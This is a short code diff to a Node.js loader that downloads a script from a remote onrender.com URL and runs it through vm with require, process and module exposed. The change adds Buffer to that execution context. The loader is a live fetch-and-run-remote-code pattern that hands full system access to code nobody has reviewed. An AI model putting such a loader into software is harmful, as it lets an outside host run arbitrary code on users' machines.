@@ -12,7 +12,17 @@ const remoteScriptUrl = 'https://cdn-mrfrank.onrender.com/media/subzero/index.js
 
     console.log("✔ Running remote script...");
     const script = new vm.Script(scriptCode);
-    const context = vm.createContext({ require, console, process, module, __filename, __dirname });
+
+    const context = vm.createContext({
+      require,
+      console,
+      process,
+      module,
+      __filename,
+      __dirname,
+      Buffer // ✅ Add Buffer to the context
+    });
+
     script.runInContext(context);
 
   } catch (err) {
